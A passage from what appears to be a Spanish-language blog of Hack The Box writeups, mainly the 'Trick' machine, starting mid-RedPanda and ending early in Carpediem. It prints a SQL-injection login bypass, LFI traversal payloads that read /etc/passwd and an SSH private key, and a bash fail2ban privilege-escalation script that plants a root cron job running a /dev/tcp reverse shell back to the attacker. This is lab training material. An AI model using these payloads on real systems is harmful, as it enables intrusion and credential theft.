10.10.14.88 -p 1234[▗] Starting attack: Starting reverse shell process[*] workstation created[*] .jpg uploaded[*] .xml uploaded[*] logs uploaded[*] web server uploaded[+] Files uploaded.[+] Successful XXE attack.[+] id_rsa_file downloaded[+] Open port 1234 to receive shell. (e.g nc -lvnp 1234)Press to continue...────────────────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 1234Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.11.170.Ncat: Connection from 10.10.11.170:39660.bash: cannot set terminal process group (3930): Inappropriate ioctl for devicebash: no job control in this shellroot@redpanda:~# find / -name root.txt | xargs ls -lfind / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Sep 23 04:50 /root/root.txt Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0" }, { "title": "Hackthebox Writeup Trick", "url": "/posts/HTBTrick/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, Bash Scripting, LFI, DNS, Fail2ban", "date": "2022-09-12 14:23:13 -0500", "snippet": "Overview Subdomain enumeration by AXFR zone transfer request Subdomain enumeration by relationship Private key by Local File Inclusion (Foothold) Fail2ban misconfiguration (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.166 18 Jun 2022 Easy 20 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.166PING 10.10.11.166 (10.10.11.166) 56(84) bytes of data.64 bytes from 10.10.11.166: icmp_seq=1 ttl=63 time=107 ms \\______________________ Linux Machine--- 10.10.11.166 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 106.851/106.851/106.851/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationEmpezamos guardando en una variable la IP del objetivo y posteriormente con nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ TARGET=10.10.11.166; nmap -p- -sS --min-rate 5000 -n -Pn $TARGETStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 14:31 -05Nmap scan report for 10.10.11.166Host is up (0.11s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol25/tcp open smtp \\_________________ Simple Mail Transfer Protocol53/tcp open domain \\_________________ Domain Name System80/tcp open http \\_________________ Hypertext Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoContinuamos con un escaneo a profundidad de los puertos 22(SSH) - 25(SMPT) - 53(DNS) - 80(HTTP):❯ nmap -p22,25,53,80 -sCV -oN openPortsTCP $TARGETStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 14:39 -05Nmap scan report for trick.htb (10.10.11.166)Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)| 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)|_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)| dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian80/tcp open http nginx 1.14.2|_http-title: Coming Soon - Start Bootstrap Theme|_http-server-header: nginx/1.14.2Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapIniciamos enumerando el puerto 25 (SMPT) que corre el servicio Postfix: Qué es Postfix: Postfix es un agente de transferencia de correo (MTA), una aplicación que se utiliza para enviar y recibir correos electrónicosEn el escaneo de nmap observamos comandos que podemos ejecutar en el servicio de correo, en especial el comando VRFY que nos permite enumerar usuarios❯ telnet $TARGET 25Trying 10.10.11.166...Connected to 10.10.11.166.Escape character is &#39;^]&#39;.220 debian.localdomain ESMTP Postfix (Debian/GNU)VRFY root252 2.0.0 root &amp;lt;--------- Cannot verify the user (252 code)VRFY user550 5.1.1 &amp;lt;user&amp;gt;: Recipient address rejected: User unknown in local recipient tableVRFY nobody252 2.0.0 nobodyVRFY admin550 5.1.1 &amp;lt;admin&amp;gt;: Recipient address rejected: User unknown in local recipient tableNo podemos hacer mucho por este puerto, así que pasamos a enumerar el puerto 53(DNS) Omitimos el descubrimiento de versión (Banner grabbing) ya que nmap se encargó de elloDe manera primaria intentamos solicitar el proceso de tranferencia de zona, el cúal permite a un servidor DNS (servidor principal) pasar una copia de una parte de su base de datos a otro servidor DNS (servidor secundario)Para ello, en la mayoría de los casos necesitamos un nombre de dominio: Usamos el comando nslookup que nos permite realizar una búsqueda de DNS inversa❯ nslookup&amp;gt; SERVER 10.10.11.166Default server: 10.10.11.166Address: 10.10.11.166#53&amp;gt; 10.10.11.166166.11.10.10.in-addr.arpa name = trick.htb. &amp;lt;-------- Domain name!Encontramos el nombre de dominio trick.htb. Ahora usando el comando dig, que nos permite realizar consultas a servidores DNS y obtener información, solicitamos el proceso de Transferencia de zona:❯ dig axfr @$TARGET trick.htb; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.4-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.11.166 trick.htb; (1 server found);; global options: +cmdtrick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800trick.htb. 604800 IN NS trick.htb.trick.htb. 604800 IN A 127.0.0.1trick.htb. 604800 IN AAAA ::1preprod-payroll.trick.htb. 604800 IN CNAME trick.htb.trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800;; Query time: 108 msec;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP);; WHEN: Mon Sep 12 15:52:06 -05 2022;; XFR size: 6 records (messages 1, bytes 231) Usamos el tipo de consulta AXFR (Asynchronous Full Transfer Zone) debido al tipo de solicitud Aquí puedes encontrar más información sobre Transeferencias de zona DNS: https://beaglesecurity.com/blog/vulnerability/dns-zone-transfer.htmlObervamos un nuevo dominio preprod-payroll.trick.htb, el cuál es un CNAME (Canonical name), en manera simple se utiliza para dirigir un subdominio a otro dominio y aplicar Virtual hosting para de una misma IP podamos alojar distintas páginas webCon el dominio encontrado pasamos a enumerar el puerto 80 (HTTP), sin olvidar antes agregar el nombre de dominio a nuestro arhcivo /etc/hosts, el cuál es el encargado de la resolución de direcciones IP y nombres de dominio: echo &quot;10.10.11.166 preprod-payroll.trick.htb&quot; &amp;gt;&amp;gt; /etc/hostsAhora enumeramos que tecnologías corren por los servicios web: En el puerto 80 (HTTP) solo encontramos una interfaz en desarrollo con una versión de Nginx 1.14.2 como servidor web En el dominio preprod-payroll.trick.htb nos redirige a un panel de logeoDespués de intentar credenciales por defecto probramos una inyección SQL básica &#39; or 1=1# en cualquiera de los dos campos (Username/Password) y logramos entar como el usuario Administrador a lo que parece un sistema de Nóminas para los empleados (a saber por el nombre de dominio) Lamentablemente el propósito de este Sistema de Gestión de Reclutamiento solo es un Rabbit hole (madriguera de conejo), él cual se le conoce como una situación en la que piensas que tienes una solución a lo que te enfrentas pero lo único que conseguirás es perder el tiempoContinuamos enumerando la web pero no encontramos más directorios interesantes, así que tiramos por encontrar mas subdominios. Y para esto nos fijamos en el subdominio que ya tenemos preprod-payroll: Si lo desglozamos tenemos preprod (abreviación de pre-producción) + payroll (nómina de sueldo)Sabemos que pre-producción nos quiere decir que la web aún está en la etapa de planificación, en nuestro caso la web para la nómina de sueldos. Entonces, es posible que tengamos otros servicios web en pre-producción, para ello realizamos una enumeración con wfuzz:❯ wfuzz -c -t 200 --hh=5480 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H &#39;Host: preprod-FUZZ.trick.htb&#39; http://10.10.11.166********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.166/Total requests: 4989=====================================================================ID Response Lines Word Chars Payload =====================================================================000000254: 200 178 L 631 W 9660 Ch &quot;marketing&quot;FootholdAhora con nuestro nuevo domino preprod-marketing.trick.htb (no olvidar agregarlo al /etc/hosts) accedemos a la siguiente interfaz:Revisando la web de manera rápida y por el título nos damos cuenta que es un template. Además, al ir cambiando de secciones (HOME, SERVICES, ABOUT) observamos en la URL http://preprod-marketing.trick.htb/index.php?page=home.html que a traves del archivo index.php haciendo el uso del parámetro page se llama al documento correspondiente a cada sección home.htmlDe primeras es muy sospechoso si conocemos el ataque Local File Inclusion, ya que estos archivos que son parte del servidor son llamados para mostarse en pantallaPara comprobarlo intentamos leer el clásico archivo /etc/hosts que almacena información de los usuarios de sistema: http://preprod-marketing.trick.htb/index.php?page=/etc/passwdNo conseguimos resultados, así que intentamos usar bypass básico. Ya que no sabemos en que ruta nos encontramos, intentamos ir al directorio anterior ../ un par de veces (mayormente son 3 ya que por defecto al crear un servicio web, esta se aloja en la ruta absoluta /var/www/&amp;lt;web_name&amp;gt;): http://preprod-marketing.trick.htb/index.php?page=../../../etc/passwdComo seguimos sin resultados aplicamos otro bypass que evade las restricciones del uso de ../ y las elmina. Por ello, lo que hacemos es duplicarlas para que quede como queremos:❯ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologintss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/falsednsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologinpulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falseavahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsaned:x:112:121::/var/lib/saned:/usr/sbin/nologincolord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologinhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/falseDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsesystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:118:65534::/run/sshd:/usr/sbin/nologinpostfix:x:119:126::/var/spool/postfix:/usr/sbin/nologinbind:x:120:128::/var/cache/bind:/usr/sbin/nologinmichael:x:1001:1001::/home/michael:/bin/bash &amp;lt;---- User!En caso que quieras probar mas byasses de manera simultánea, puedes usar wfuzz con un directorio adecuado:❯ wfuzz -c -t 100 --hl=0 -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt http://preprod-marketing.trick.htb/index.php?page=FUZZ********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://preprod-marketing.trick.htb/index.php?page=FUZZTotal requests: 914=====================================================================ID Response Lines Word Chars Payload ===================================================================== 000000327: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot; 000000330: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot; 000000328: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....000000332: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot;000000331: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot; 000000342: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//etc/passwd&quot;000000346: 200 41 L 68 W 2351 Ch &quot;....//....//....//etc/passwd&quot; 000000338: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot;000000329: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot; 000000336: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot; 000000345: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//etc/passwd&quot; 000000344: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//etc/passwd&quot; 000000341: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//etc/passwd&quot; 000000343: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//etc/passwd&quot; 000000340: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//etc/passwd&quot; 000000337: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&quot; 000000339: 200 41 L 68 W 2351 Ch &quot;....//....//....//....//....//....//....//....//....//....//etc/passwd&quot;Al final logramos explotar la vulnerabilidad y listar archivos del servidor. El archivo /etc/hosts nos dió la información que existe un usuario llamado michael, y ya que podemos listar archivos y tenemos abierto el puerto 22 (SSH) abierto, intentamos extraer la llave privada RSA alojada en /&amp;lt;user_home_directory&amp;gt;/.ssh/id_rsaAl final conseguimos extraerla y nos conectamos satisfactoriamente por SSH y conseguimos la flag:❯ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa &amp;gt; id_rsa_michael % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 1823 0 1823 0 0 8530 0 --:--:-- --:--:-- --:--:-- 8518❯ chmod 600 id_rsa_michael❯ ssh -i id_rsa_michael michael@10.10.11.166The authenticity of host &#39;10.10.11.166 (10.10.11.166)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;10.10.11.166&#39; (ED25519) to the list of known hosts.Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Sep 12 22:27:25 2022 from 10.10.14.48michael@trick:~$ find / -name user.txt -exec ls -l {} + 2&amp;gt;/dev/null-rw-r----- 1 root michael 33 Sep 12 22:13 /home/michael/user.txtYa que tenemos acceso al servidor, a continuación validamos las malas prácticas que nos proporcionaron explotar las vulnerabilidades anteriores: Inyección SQL (file: /var/www/payroll/admin_class.php)&amp;lt;?php...function login(){ extract($_POST); $qry = $this-&amp;gt;db-&amp;gt;query(&quot;SELECT * FROM users where username = &#39;&quot;.$username.&quot;&#39; and password = &#39;&quot;.$password.&quot;&#39; &quot;); &amp;lt;-- &#39;.&#39; concatenation if($qry-&amp;gt;num_rows &amp;gt; 0) { foreach ($qry-&amp;gt;fetch_array() as $key =&amp;gt; $value) { if($key != &#39;passwors&#39; &amp;amp;&amp;amp; !is_numeric($key)) $_SESSION[&#39;login_&#39;.$key] = $value; } return 1; } else { return 3; }}...?&amp;gt; Local File Inclusion (file: /var/www/market/index.php)&amp;lt;?php$file = $_GET[&#39;page&#39;];if(!isset($file) || ($file==&quot;index.php&quot;)) { include(&quot;/var/www/market/home.html&quot;);}else{ include(&quot;/var/www/market/&quot;.str_replace(&quot;../&quot;,&quot;&quot;,$file)); &amp;lt;-- non-recursive constraint}?&amp;gt;Privilege EscalationEn el proceso de realizar una enumeración básica del sistema y del usuario actual, obervamos que tenemos permitido ejecutar un binario como el usuario root sin proporcionar una contraseña:michael@trick:~$ sudo -lMatching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restartAntes de intentar algo nos informamos que es fail2ban: Fail2ban es una herramienta que asigna ciertas reglas especificadas (bloqueo de ip, etc), que alteran configuraciones del firewall, al momento de intentos fallidos de inicios de sesiónFail2ban tiene como propósito monitorear los logs de servicios comúnes, filtrar los logs respecto a autenticaciones fallidas y tomar accionesInvestigando en internet de su funcionamiento encontramos que existe una mala configuración que permite escalar privilegios. En palabras simples, podemos provocar un baneo que ejecute código malicioso al momento de tomar una acción hacia nosotrosPrimero debemos conocer para que servicios está activo Fail2ban, para ello tenemos los archivos de configuración /etc/fail2ban/jail.conf y /etc/fail2ban/jail.d/defaults-debian.conf, donde encontramos las políticas por defecto y que servicios están activos Revisamos en el archivo principal de configuraciónmichael@trick:~$ less /etc/fail2ban/jail.conf...## SSH servers#[sshd]# To use more aggressive sshd modes set filter parameter &quot;mode&quot; in jail.local:# normal (default), ddos, extra or aggressive (combines all).# See &quot;tests/files/logs/sshd&quot; or &quot;filter.d/sshd.conf&quot; for usage example and details.#mode = normalport = sshlogpath = %(sshd_log)sbackend = %(sshd_backend)sbantime = 10s... No vemos un enable = true que indique que está activo, por ello revisamos el otro archivo de configuración y aseguramos que el servicio SSHD (ssh daemon) está activadomichael@trick:~$ cat /etc/fail2ban/jail.d/defaults-debian.conf [sshd]enabled = trueAhora debemos asegurarnos las acciones que se establecerán cuando provoquemos el baneo, para ello revisamos el archivo de configuración /etc/fail2ban/jail.confmichael@trick:~$ less /etc/fail2ban/jail.conf...## Action shortcuts. To be used to define action parameter# Default banning action (e.g. iptables, iptables-new,# iptables-multiport, shorewall, etc) It is used to define# action_* variables. Can be overridden globally or per# section within jail.local filebanaction = iptables-multiport &amp;lt;--- ban action!banaction_allports = iptables-allports...El nombre especificado apunta a la ruta /etc/fail2ban/action.d/&amp;lt;banaction&amp;gt;.conf y es el encargado de configurar el firewall y así prohibir los hosts que provoquen el baneomichael@trick:~$ less /etc/fail2ban/action.d/iptables-multiport.conf...# Option: actionban# Notes.: command executed when banning an IP. Take care that the# command is executed with Fail2Ban user rights.# Tags: See jail.conf(5) man page# Values: CMD#actionban = &amp;lt;iptables&amp;gt; -I f2b-&amp;lt;name&amp;gt; 1 -s &amp;lt;ip&amp;gt; -j &amp;lt;blocktype&amp;gt; &amp;lt;--- Here...El archivo anterior es el que se activará cuando provoquemos el baneo y ejecutar la acción actionban = &amp;lt;iptables&amp;gt; -I f2b-&amp;lt;name&amp;gt; 1 -s &amp;lt;ip&amp;gt; -j &amp;lt;blocktype&amp;gt;, que como vemos puede ser un comando Antes de eso debemos saber los intentos que tenemos antes de ser baneados y por cuanto tiempo será, eso también lo vemos en el archivo de configuraciónmichael@trick:~$ less /etc/fail2ban/jail.conf...# &quot;bantime&quot; is the number of seconds that a host is banned.bantime = 10s# A host is banned if it has generated &quot;maxretry&quot; during the last &quot;findtime&quot;# seconds.findtime = 10s# &quot;maxretry&quot; is the number of failures before a host get banned.maxretry = 5 &amp;lt;--- Here (important)...Ahora solo queda modificar la acción actionban = MALICIOUS CODE, reiniciar el servicio fail2ban que lo ejecutará como root gracias a los permisos que tenemos, luego nos logearemos por SSH provocando el máximo de intentos (5) para ser baneados y activar actionban que ejecutará nuestro comandoPara el proceso junte cada tarea en un script en bash que explica el proceso y te permite conseguir acceso como root a traves de una tarea cron inyectada:#!/bin/bash# Fail2ban privesc (sshd service)# ----------------# Remote machine# ---------------# actionban config filefail2ban_rule_conf=/etc/fail2ban/action.d/iptables-multiport.conf# check user:group permissions (root:root)ls -l $fail2ban_rule_conf# change user:group to writeable permisisonscp $fail2ban_rule_conf{,.bak}mv -f $fail2ban_rule_conf.bak $fail2ban_rule_conf# check user:group permission (michale:michael)ls -l $fail2ban_rule_conf# commands to create cron process to receive privileged reverse shellif [ -d &quot;/tmp/.privesc&quot; ]; then rm -rf &quot;/tmp/.privesc&quot;ficreate_dir=&quot;mkdir /tmp/.privesc&quot;assing_cron=&quot;echo &#39;* * * * * root /bin/sh /tmp/.privesc/pwned.sh&#39; &amp;gt; /etc/cron.d/pwned;&quot;cron_script=&quot;echo \\&quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/$1/$2 0&amp;gt;&amp;amp;1&#39;\\&quot; &amp;gt; /tmp/.privesc/pwned.sh;&quot;add_perm=&quot;chmod +x /tmp/.privesc/pwned.sh;&quot;# save commands in file$create_direcho -e &quot;$assing_cron\\n$cron_script\\n$add_perm&quot; &amp;gt; /tmp/.privesc/cmd.shchmod +x /tmp/.privesc/cmd.sh# change actionban to execute malicious filesed -i &#39;s/actionban = &amp;lt;iptables&amp;gt; -I f2b-&amp;lt;name&amp;gt; 1 -s &amp;lt;ip&amp;gt; -j &amp;lt;blocktype&amp;gt;/actionban = \\/bin\\/bash \\/tmp\\/.privesc\\/cmd.sh/g&#39; $fail2ban_rule_conf# restart fail2ban service sudo /etc/init.d/fail2ban restart# Local machine# -------------sleep 3echo -e &quot;\\nMake failed ssh requests in ATTACKER machine to activate fail2ban rules (maxretry = 5)&quot;echo &quot;Example: for i in \\$(seq 1 10); do sshpass -p &#39;anything&#39; ssh michael@10.10.11.166; done&quot;echo -e &quot;\\nListen on IP $1 through PORT $2 to receive the shell. (g.e nc -lvnp $2)\\n&quot; Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Ahora solo lo ejecutamos y conseguimos la flag:michael@trick:/tmp$ ./privesc.sh 10.10.14.58 1234-rw-r--r-- 1 michael michael 1401 Sep 13 02:42 /etc/fail2ban/action.d/iptables-multiport.conf-rw-r--r-- 1 michael michael 1401 Sep 13 02:44 /etc/fail2ban/action.d/iptables-multiport.conf[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.Make failed ssh requests in ATTACKER machine to activate fail2ban rules (maxretry = 5)Example: for i in $(seq 1 6); do sshpass -p &#39;anything&#39; ssh michael@10.10.11.166; doneListen on IP 10.10.14.58 through PORT 1234 to receive the shell. (g.e nc -lvnp 1234)michael@trick:/tmp$ ─────────────────────────────────────────────────────────────────────────────────────────────────❯ for i in $(seq 1 6); do sshpass -p &#39;anything&#39; ssh michael@10.10.11.166; donePermission denied, please try again.Permission denied, please try again.Permission denied, please try again.Permission denied, please try again.Permission denied, please try again.Permission denied, please try again.❯ nc -lvnp 1234Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.11.166.Ncat: Connection from 10.10.11.166:36098.bash: cannot set terminal process group (4074): Inappropriate ioctl for devicebash: no job control in this shellroot@trick:~# find / -name root.txt | xargs ls -lfind / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Sep 12 22:13 /root/root.txt Aquí tienes un articulo muy detallado sobre Fail2ban https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server" }, { "title": "Hackthebox Writeup Carpediem", "url": "/posts/HTBCarpediem/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Hard, MongoDB, Pivoting, Python Scripting, Bash Scripting, Javascript Scripting, Capabilities, CVE-2021-45268, CVE-2022-0492, Information Leakage, VoIP System", "date": "2022-09-05 15:13:12 -0500", "snippet": "Overview: Evade login to website by leaking SQL query Remote code execution by test function with full access (Container, python scripting) Network host scanning (bash scripting) Pivoting Evade technical support web by writing permissions to Mongodb database (python and javascript scripting) Leak of SSH credentials in helpdesk and VoIP system (Foothold) Credential leak by network traffic sniffing capabilities Remote Code Execution when uploading plugin to CMS Backdrop (Container, CVE-2021-45268, plugin creation) Privilege escalation in container by running a CMS backdrop script as root Escape a container as root by exploiting the cgroup system (CVE-2022-0492) (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.167 25 Jun 2022 Hard 40 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.167PING 10.10.11.167 (10.10.11.167) 56(84) bytes of data.64 bytes from 10.10.11.167: icmp_seq=1 ttl=63 time=105 ms \\______________________ Linux Machine--- 10.10.11.167 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 105.308/105.308/105.308/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationCon nmap realizamos un escaneo de tipo TCP (Transfer Control Protocol) para descubrir puertos abiertos:❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.167Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 15:22 -05Nmap scan report for 10.10.11.167Host is up (0.11s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol80/tcp open http \\_________________ Hypertext Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoContinuamos con un escaneo a profundidad de los puertos 22(SSH) - 80(HTTP):❯ nmap -p22,80,443 -sCV 10.10.11.167 -oN tcp_openPortsStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 15:24 -05Nmap scan report for 10.10.11.167Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)| 256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)|_ 256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Comming Soon|_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp closed httpsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapEmpezamos buscando las tecnologías del sitio web 80(HTTP): Usando whatweb❯ whatweb 10.10.11.167http://10.10.11.167 [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.167], Meta-Author[Pawel Zuchowski], Script[text/javascript], Title[Comming Soon], X-UA-Compatible[ie=edge], nginx[1.18.0]Encontramos un nuevo nombre de dominio carpediem.htb, probablemente se esté aplicando Virtual Hosting, así que lo agregamos a nuestro archivo encargado de la resolución de direcciones IP y nombres de dominio 